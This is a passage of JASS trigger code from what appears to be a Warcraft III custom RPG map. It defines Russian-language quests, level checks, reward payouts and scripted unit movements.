call DestroyGroup(SR)
call TriggerSleepAction(30.)
if BWp() then
call UnitAddAbilityBJ($416E6532,JW)
call UnitAddAbilityBJ($41706974,JW)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFМои поздравления!|r
Получите награду!")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FFFF00За задание Все игроки получили по 1000 золота!")
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF9696Все, кто 51 уровня, заработали 50 Кровавых Меток.")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=6
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BWo() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+3000
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+150
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
endif
else
endif
else
endif
else
endif
else
endif
else
endif
else
endif
else
endif
else
call ne(GetTriggerUnit(),"Задание с |c00ff000051|r уровня",.027,255,255,255)
endif
endfunction
function BWz takes nothing returns nothing
set bt=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(bt,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(bt,Condition(function BWf))
call TriggerAddAction(bt,function BWy)
endfunction
function BW0 takes nothing returns nothing
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|c00ff0000Задание провалено!!!")
endfunction
function BW1 takes nothing returns nothing
set bu=CreateTrigger()
call TriggerRegisterUnitEvent(bu,JW,EVENT_UNIT_DEATH)
call TriggerAddAction(bu,function BW0)
endfunction
function BW2 takes nothing returns boolean
if not (GetRandomInt(1,100)<=MK*4) then
return false
endif
return true
endfunction
function BW3 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BW4 takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BW5 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BW6 takes nothing returns boolean
return GetBooleanAnd(BW4(),BW5())
endfunction
function BW7 takes nothing returns boolean
return GetBooleanAnd(BW3(),BW6())
endfunction
function BW8 takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=45) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=49) then
return false
endif
return true
endfunction
function BW9 takes nothing returns nothing
if BW8() then
call AddHeroXP(GetEnumUnit(),9000,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+9000
else
endif
endfunction
function BXB takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=45) then
return false
endif
return true
endfunction
function BXC takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
if BW2() then
call CreateItemLoc($49304C32,GetUnitLoc(GetTriggerUnit()))
call PlaySoundOnUnitBJ(C,100,GetTriggerUnit())
call CreateTextTagUnitBJ("Удача! Вам выпала |c00ffff00\"Загубленная Душа\"",GetTriggerUnit(),0,15.,100.,100.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
endif
call ModifyGateBJ(bj_GATEOPERATION_OPEN,Hh)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ух, какие молодцы=))) можете пройти дальше а также держите небольшую награду)")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BW7))
call ForGroupBJ(Th,function BW9)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF9000 опыта|r, |c00ffff001000 золота|r, |c00ff969650 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BXB() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+3000
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+150
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BXD takes nothing returns nothing
set bv=CreateTrigger()
call TriggerRegisterUnitEvent(bv,LP,EVENT_UNIT_DEATH)
call TriggerAddAction(bv,function BXC)
endfunction
function BXE takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D46)==true) then
return false
endif
return true
endfunction
function BXF takes nothing returns nothing
if BXE() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304D46))
call DisplayTextToForce(GetPlayersAll(),"|c00ff9696Ну что ж, Вам удалось! Путь открыт...")
call TriggerSleepAction(5.)
call ShowUnit(Lz,true)
call RemoveUnit(Ip)
call EnableTrigger(Ux)
call DisableTrigger(GetTriggeringTrigger())
else
call DisplayTextToForce(GetPlayersAll(),"|c00ff9696Для того, чтобы пройти дальше, добудьте для меня Механизм. Где искать данную вещь - думайте сами.")
endif
endfunction
function BXG takes nothing returns nothing
set bw=CreateTrigger()
call TriggerRegisterEnterRectSimple(bw,GQ)
call TriggerAddAction(bw,function BXF)
endfunction
function BXH takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D47)==true) then
return false
endif
return true
endfunction
function BXI takes nothing returns nothing
call RemoveDestructable(HE)
call DisplayTextToForce(GetPlayersAll(),"Дерево уничтожено. Вау...
")
call PauseUnit(Lm,false)
call SetUnitInvulnerable(Lm,false)
endfunction
function BXJ takes nothing returns nothing
set bx=CreateTrigger()
call TriggerRegisterEnterRectSimple(bx,Ee)
call TriggerAddCondition(bx,Condition(function BXH))
call TriggerAddAction(bx,function BXI)
endfunction
function BXK takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BXL takes nothing returns nothing
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Есть желание мне помочь? Хм.... что-то Вы слишком жалкие на вид... Слишком хлипкие, ничтожные. Да моя бабушка, и то более грозно смотрелась, хотя хромала постоянно. Ладно, дам Вам шанс. Убейте Ассира, потом поговорим.")
endfunction
function BXM takes nothing returns nothing
set by=CreateTrigger()
call TriggerRegisterEnterRectSimple(by,Es)
call TriggerAddCondition(by,Condition(function BXK))
call TriggerAddAction(by,function BXL)
endfunction
function BXN takes nothing returns nothing
call EnableTrigger(b0)
call DisableTrigger(by)
endfunction
function BXO takes nothing returns nothing
set bz=CreateTrigger()
call TriggerRegisterUnitEvent(bz,Ly,EVENT_UNIT_DEATH)
call TriggerAddAction(bz,function BXN)
endfunction
function BXP takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6F303048) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BXQ takes nothing returns nothing
call DestroyEffectBJ(Us[46])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: не имеет значения|r
Так, воины. Мне нужно пройти одно испытание, дабы выиграть спор с одним мудилой. Поможете - отдам кое-что ценное. Нет, так нет. Когда будете готовы - просто напишите |c00ff0000-go|r, и я перейду в командование того игрока, кто согласился мной управлять.")
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(b1)
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
endfunction
function BXR takes nothing returns nothing
set b0=CreateTrigger()
call DisableTrigger(b0)
call TriggerRegisterAnyUnitEventBJ(b0,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(b0,Condition(function BXP))
call TriggerAddAction(b0,function BXQ)
endfunction
function BXS takes nothing returns boolean
if not (GetOwningPlayer(Jt)==Player(8)) then
return false
endif
return true
endfunction
function BXT takes nothing returns nothing
call IssuePointOrderLoc(IR,"move",GetRectCenter(Eh))
call IssuePointOrderLoc(IS,"move",GetRectCenter(Ej))
call SetUnitPositionLoc(IU,GetRectCenter(Ek))
call SetUnitPositionLoc(IV,GetRectCenter(Ep))
call SetUnitPositionLoc(IT,GetRectCenter(Em))
set MT[8]=Jt
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(b2)
call EnableTrigger(b3)
call EnableTrigger(b4)
call SetUnitOwner(Jt,GetTriggerPlayer(),true)
call SetUnitPositionLoc(Jt,GetRectCenter(Eq))
call PanCameraToTimedLocForPlayer(GetTriggerPlayer(),GetRectCenter(Eq),0)
endfunction
function BXU takes nothing returns nothing
set b1=CreateTrigger()
call DisableTrigger(b1)
call TriggerRegisterPlayerChatEvent(b1,Player(0),"-go",true)
call TriggerRegisterPlayerChatEvent(b1,Player(1),"-go",true)
call TriggerRegisterPlayerChatEvent(b1,Player(2),"-go",true)
call TriggerRegisterPlayerChatEvent(b1,Player(3),"-go",true)
call TriggerRegisterPlayerChatEvent(b1,Player(4),"-go",true)
call TriggerRegisterPlayerChatEvent(b1,Player(5),"-go",true)
call TriggerRegisterPlayerChatEvent(b1,Player(6),"-go",true)
call TriggerRegisterPlayerChatEvent(b1,Player(7),"-go",true)
call TriggerAddCondition(b1,Condition(function BXS))
call TriggerAddAction(b1,function BXT)
endfunction
function BXV takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6F303048) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())!=Player(8)) then
return false
endif
return true
endfunction
function BXW takes nothing returns nothing
set MT[8]=CreateUnitAtLoc(GetOwningPlayer(GetTriggerUnit()),$6F303048,GetRectCenter(Eq),270.)
call PanCameraToTimedLocForPlayer(GetTriggerPlayer(),GetRectCenter(Eq),0)
call IssuePointOrderLoc(IR,"move",GetRectCenter(Eh))
call IssuePointOrderLoc(IS,"move",GetRectCenter(Ej))
call IssuePointOrderLoc(IU,"move",GetRectCenter(El))
call IssuePointOrderLoc(IV,"move",GetRectCenter(Eo))
call IssuePointOrderLoc(IT,"move",GetRectCenter(En))
endfunction
function BXX takes nothing returns nothing
set b5=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(b5,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(b5,Condition(function BXV))
call TriggerAddAction(b5,function BXW)
endfunction
function BXY takes nothing returns nothing
call IssueImmediateOrder(GetEnumUnit(),"fanofknives")
endfunction
function BXZ takes nothing returns nothing
set ST[333]=GetUnitsOfTypeIdAll($68303446)
call ForGroupBJ(ST[333],function BXY)
call DestroyGroup(ST[333])
endfunction
function BXa takes nothing returns nothing
set b2=CreateTrigger()
call DisableTrigger(b2)
call TriggerRegisterTimerEventPeriodic(b2,4.)
call TriggerAddAction(b2,function BXZ)
endfunction
function BXb takes nothing returns boolean
if not (GetTerrainTypeBJ(b6[0])!=$5872746C) then
return false
endif
return true
endfunction
function BXc takes nothing returns nothing
set b6[0]=GetUnitLoc(MT[8])
if BXb() then
call KillUnit(MT[8])
else
endif
call RemoveLocation(b6[0])
endfunction
function BXd takes nothing returns nothing
set b3=CreateTrigger()
call DisableTrigger(b3)
call TriggerRegisterTimerEventPeriodic(b3,.5)
call TriggerAddAction(b3,function BXc)
endfunction
function BXe takes nothing returns nothing
call IssuePointOrderLoc(IP,"carrionswarm",GetUnitLoc(IP))
call IssuePointOrderLoc(IN,"carrionswarm",GetUnitLoc(IN))
call IssuePointOrderLoc(IO,"carrionswarm",GetUnitLoc(IO))
endfunction
function BXf takes nothing returns nothing
set b4=CreateTrigger()
call DisableTrigger(b4)
call TriggerRegisterTimerEventPeriodic(b4,7.)
call TriggerAddAction(b4,function BXe)
endfunction
function BXg takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303447) then
return false
endif
return true
endfunction
function BXh takes nothing returns boolean
if not (RectContainsUnit(Eg,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BXi takes nothing returns boolean
if not (RectContainsUnit(Eh,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BXj takes nothing returns boolean
if not (RectContainsUnit(Ei,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BXk takes nothing returns boolean
if not (RectContainsUnit(Ej,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BXl takes nothing returns boolean
if not (RectContainsUnit(Ek,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BXm takes nothing returns boolean
if not (RectContainsUnit(El,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BXn takes nothing returns boolean
if not (RectContainsUnit(Ep,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BXo takes nothing returns boolean
if not (RectContainsUnit(Eo,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BXp takes nothing returns boolean
if not (RectContainsUnit(Em,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BXq takes nothing returns boolean
if not (RectContainsUnit(En,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BXr takes nothing returns nothing
if BXh() then
call IssuePointOrderLoc(GetTriggerUnit(),"move",GetRectCenter(Eh))
else
endif
if BXi() then
call IssuePointOrderLoc(GetTriggerUnit(),"move",GetRectCenter(Eg))
else
endif
if BXj() then
call IssuePointOrderLoc(GetTriggerUnit(),"move",GetRectCenter(Ej))
else
endif
if BXk() then
call IssuePointOrderLoc(GetTriggerUnit(),"move",GetRectCenter(Ei))
else
endif
if BXl() then
call IssuePointOrderLoc(GetTriggerUnit(),"move",GetRectCenter(El))
else
endif
if BXm() then
call IssuePointOrderLoc(GetTriggerUnit(),"move",GetRectCenter(Ek))
else
endif
if BXn() then
call IssuePointOrderLoc(GetTriggerUnit(),"move",GetRectCenter(Eo))
else
endif
if BXo() then
call IssuePointOrderLoc(GetTriggerUnit(),"move",GetRectCenter(Ep))
else
endif
if BXp() then
call IssuePointOrderLoc(GetTriggerUnit(),"move",GetRectCenter(En))
else
endif
if BXq() then
call IssuePointOrderLoc(GetTriggerUnit(),"move",GetRectCenter(Em))
else
endif
endfunction
function BXs takes nothing returns nothing
set b7=CreateTrigger()
call TriggerRegisterEnterRectSimple(b7,Eg)
call TriggerRegisterEnterRectSimple(b7,Eh)
call TriggerRegisterEnterRectSimple(b7,Ei)
call TriggerRegisterEnterRectSimple(b7,Ej)
call TriggerAddCondition(b7,Condition(function BXg))
call TriggerAddAction(b7,function BXr)
endfunction
function BXt takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6F303048) then
return false
endif
return true
endfunction
function BXu takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=50) then
return false
endif
return true
endfunction
function BXv takes nothing returns nothing
call CreateItemLoc($49304D50,GetRectCenter(Es))
call SetItemUserData(GetLastCreatedItem(),GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit())))
call SetUnitOwner(GetTriggerUnit(),Player(8),true)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"|c00ffff00Искатель Приключений:|r У вас получилось!!! Урааааа!!! Я выиграю спор! Ну что ж, держите награду, заслужили.")
call TriggerSleepAction(2.)
call DisplayTextToForce(GetPlayersAll(),GetPlayerName(GetOwningPlayer(GetTriggerUnit()))+" получил в награду |c0000ffffДушу Ассира|r. Все остальные игроки получили |c00ff969650 Кровавых Меток|r и |c00ffff00500 золота")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=6
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BXu() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1500
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+150
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BXw takes nothing returns nothing
set b8=CreateTrigger()
call TriggerRegisterEnterRectSimple(b8,Er)
call TriggerAddCondition(b8,Condition(function BXt))
call TriggerAddAction(b8,function BXv)
endfunction
function BXx takes nothing returns boolean
if not (GetTriggerUnit()==IU) then
return false
endif
return true
endfunction
function BXy takes nothing returns nothing
call IssuePointOrderLoc(IU,"move",GetRectCenter(El))
endfunction
function BXz takes nothing returns nothing
set b9=CreateTrigger()
call TriggerRegisterEnterRectSimple(b9,Ek)
call TriggerAddCondition(b9,Condition(function BXx))
call TriggerAddAction(b9,function BXy)
endfunction
function BX0 takes nothing returns boolean
if not (GetTriggerUnit()==IU) then
return false
endif
return true
endfunction
function BX1 takes nothing returns nothing
call IssuePointOrderLoc(IU,"move",GetRectCenter(Ek))
endfunction
function BX2 takes nothing returns nothing
set cB=CreateTrigger()
call TriggerRegisterEnterRectSimple(cB,El)
call TriggerAddCondition(cB,Condition(function BX0))
call TriggerAddAction(cB,function BX1)
endfunction
function BX3 takes nothing returns boolean
if not (GetTriggerUnit()==IV) then
return false
endif
return true
endfunction
function BX4 takes nothing returns nothing
call IssuePointOrderLoc(IV,"move",GetRectCenter(Eo))
endfunction
function BX5 takes nothing returns nothing
set cC=CreateTrigger()
call TriggerRegisterEnterRectSimple(cC,Ep)
call TriggerAddCondition(cC,Condition(function BX3))
call TriggerAddAction(cC,function BX4)
endfunction
function BX6 takes nothing returns boolean
if not (GetTriggerUnit()==IV) then
return false
endif
return true
endfunction
function BX7 takes nothing returns nothing
call IssuePointOrderLoc(IV,"move",GetRectCenter(Ep))
endfunction
function BX8 takes nothing returns nothing
set cD=CreateTrigger()
call TriggerRegisterEnterRectSimple(cD,Eo)
call TriggerAddCondition(cD,Condition(function BX6))
call TriggerAddAction(cD,function BX7)
endfunction
function BX9 takes nothing returns boolean
if not (GetTriggerUnit()==IT) then
return false
endif
return true
endfunction
function BYB takes nothing returns nothing
call IssuePointOrderLoc(IT,"move",GetRectCenter(En))
endfunction
function BYC takes nothing returns nothing
set cE=CreateTrigger()
call TriggerRegisterEnterRectSimple(cE,Em)
call TriggerAddCondition(cE,Condition(function BX9))
call TriggerAddAction(cE,function BYB)
endfunction
function BYD takes nothing returns boolean
if not (GetTriggerUnit()==IT) then
return false
endif
return true
endfunction
function BYE takes nothing returns nothing
call IssuePointOrderLoc(IT,"move",GetRectCenter(Em))
endfunction
function BYF takes nothing returns nothing
set cF=CreateTrigger()
call TriggerRegisterEnterRectSimple(cF,En)
call TriggerAddCondition(cF,Condition(function BYD))
call TriggerAddAction(cF,function BYE)
endfunction
function BYG takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6830344E) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BYH takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=17) then
return false
endif
return true
endfunction
function BYI takes nothing returns nothing
if BYH() then
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(cH)
call DestroyEffectBJ(Us[47])
call AddSpecialEffectTargetUnitBJ("overhead",Ju,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[47]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Пираты\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 17-23|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Пираты","Имели когда-то дело с пиратами? Хитрые создания. Уничтожьте их корабль, он пришвартован недалеко отсюда..
|c006969FFУровень задания:|r 17-23","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[47]=GetLastCreatedQuestBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
else
call ne(GetTriggerUnit(),"Задание с |c00ff000017|r уровня",.027,255,255,255)
endif
endfunction
function BYJ takes nothing returns nothing
set cG=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cG,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cG,Condition(function BYG))
call TriggerAddAction(cG,function BYI)
endfunction
function BYK takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830344F) then
return false
endif
return true
endfunction
function BYL takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DisplayTextToForce(GetPlayersAll(),"|c00ff7f00Судно Пиратов пошло ко дну! Вернитесь за наградой.|r")
call EnableTrigger(cI)
call DestroyEffectBJ(Us[47])
call AddSpecialEffectTargetUnitBJ("overhead",Ju,"war3mapImported\\QuestYellow1.mdx")
set Us[47]=GetLastCreatedEffectBJ()
endfunction
function BYM takes nothing returns nothing
set cH=CreateTrigger()
call DisableTrigger(cH)
call TriggerRegisterAnyUnitEventBJ(cH,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(cH,Condition(function BYK))
call TriggerAddAction(cH,function BYL)
endfunction
function BYN takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6830344E) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BYO takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BYP takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BYQ takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BYR takes nothing returns boolean
return GetBooleanAnd(BYP(),BYQ())
endfunction
function BYS takes nothing returns boolean
return GetBooleanAnd(BYO(),BYR())
endfunction
function BYT takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=17) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=23) then
return false
endif
return true
endfunction
function BYU takes nothing returns nothing
if BYT() then
call AddHeroXP(GetEnumUnit(),3000,false)
else
endif
endfunction
function BYV takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=17) then
return false
endif
return true
endfunction
function BYW takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=17) then
return false
endif
return true
endfunction
function BYX takes nothing returns nothing
if BYW() then
call DisableTrigger(GetTriggeringTrigger())
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call DestroyEffectBJ(Us[47])
call QuestSetCompletedBJ(YX[47],true)
call DestroyQuest(YX[47])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Жрица:|r спасибо за помощь, Герои. Не желаете взгянуть на мои товары?")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BYS))
call ForGroupBJ(Th,function BYU)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3000 опыта|r, |c00ffff00300 золота|r, |c00ff969615 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BYV() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+900
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+45
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000017|r уровня",.027,255,255,255)
endif
endfunction
function BYY takes nothing returns nothing
set cI=CreateTrigger()
call DisableTrigger(cI)
call TriggerRegisterAnyUnitEventBJ(cI,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cI,Condition(function BYN))
call TriggerAddAction(cI,function BYX)
endfunction
function BYZ takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BYa takes nothing returns nothing
call SetUnitLifePercentBJ(L6,100)
call SetUnitLifePercentBJ(Vd[0],100)
endfunction
function BYb takes nothing returns nothing
set cJ=CreateTrigger()
call TriggerRegisterLeaveRectSimple(cJ,E1)
call TriggerAddCondition(cJ,Condition(function BYZ))
call TriggerAddAction(cJ,function BYa)
endfunction
function BYc takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$75303031) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=200.) then
return false
endif
return true
endfunction
function BYd takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=25) then
return false
endif
return true
endfunction
function BYe takes nothing returns nothing
if BYd() then
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[48])
call AddSpecialEffectTargetUnitBJ("overhead",J4,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[48]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Взорвать к чертям!\".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 25-28|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Взорвать к чертям!","|c006969FFУровень задания: 25-28|r
Приказал мне господин уничтожить все остатки наших старых строений. От старинных построек остались лишь балки, их немного но их надо снести. Видите ли, не вписываются они в общий интерьер окру��ения. Так вот, берете бочку и пошли уничтожать! 1 балка в лесу, 1 у пауков, 2 у драконов и последняя в джунглях","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[48]=GetLastCreatedQuestBJ()
call SetUnitOwner(GetOrderTargetUnit(),Player(8),true)
call CreateItemLoc($49304F4A,GetUnitLoc(GetTriggerUnit()))
else
call ne(GetTriggerUnit(),"Задание с |c00ff000025|r уровня",.027,255,255,255)
endif
endfunction
function BYf takes nothing returns nothing
set cK=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(cK,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(cK,Condition(function BYc))
call TriggerAddAction(cK,function BYe)
endfunction
function BYg takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49304F4A) then
return false
endif
return true
endfunction
function BYh takes nothing returns boolean
if not (TW[5]>=5) then
return false
endif
return true
endfunction
function BYi takes nothing returns boolean
if not (RectContainsUnit(E9,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BYj takes nothing returns boolean
if not (TW[5]>=5) then
return false
endif
return true
endfunction
function BYk takes nothing returns boolean
if not (RectContainsUnit(E8,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BYl takes nothing returns boolean
if not (TW[5]>=5) then
return false
endif
return true
endfunction
function BYm takes nothing returns boolean
if not (RectContainsUnit(E7,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BYn takes nothing returns boolean
if not (TW[5]>=5) then
return false
endif
return true
endfunction
function BYo takes nothing returns boolean
if not (RectContainsUnit(FV,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BYp takes nothing returns boolean
if not (TW[5]>=5) then
return false
endif
return true
endfunction
function BYq takes nothing returns boolean
if not (RectContainsUnit(E6,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function BYr takes nothing returns nothing
if BYi() then
call RemoveRect(E9)
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Балка разрушена.")
call AddSpecialEffectLocBJ(GetRectCenter(E9),"Objects\\Spawnmodels\\Other\\NeutralBuildingExplosion\\NeutralBuildingExplosion.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call KillUnit(Jz)
set TW[5]=TW[5]+1
if BYh() then
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Все балки разрушены. Вернитесь за наградой.")
call EnableTrigger(cM)
call DestroyEffectBJ(Us[48])
call AddSpecialEffectTargetUnitBJ("overhead",J4,"war3mapImported\\QuestYellow1.mdx")
set Us[48]=GetLastCreatedEffectBJ()
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304F4A))
else
endif
else
endif
if BYk() then
call RemoveRect(E8)
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Балка разрушена.")
call AddSpecialEffectLocBJ(GetRectCenter(E8),"Objects\\Spawnmodels\\Other\\NeutralBuildingExplosion\\NeutralBuildingExplosion.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call KillUnit(J0)
set TW[5]=TW[5]+1
if BYj() then
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Все балки разрушены. Вернитесь за наградой.")
call EnableTrigger(cM)
call DestroyEffectBJ(Us[48])
call AddSpecialEffectTargetUnitBJ("overhead",J4,"war3mapImported\\QuestYellow1.mdx")
set Us[48]=GetLastCreatedEffectBJ()
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304F4A))
else
endif
else
endif
if BYm() then
call RemoveRect(E7)
call DisplayTextToForce(GetPlayersAll(),"|c00ff0000Балка разрушена.")
call AddSpecialEffectLocBJ(GetRectCenter(E7),"Objects\\Spawnmodels\\Other\\NeutralBuildingExplosion\\NeutralBuildingExplosion.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call KillUnit(J1)
set TW[5]=TW[5]+1
if BYl() then
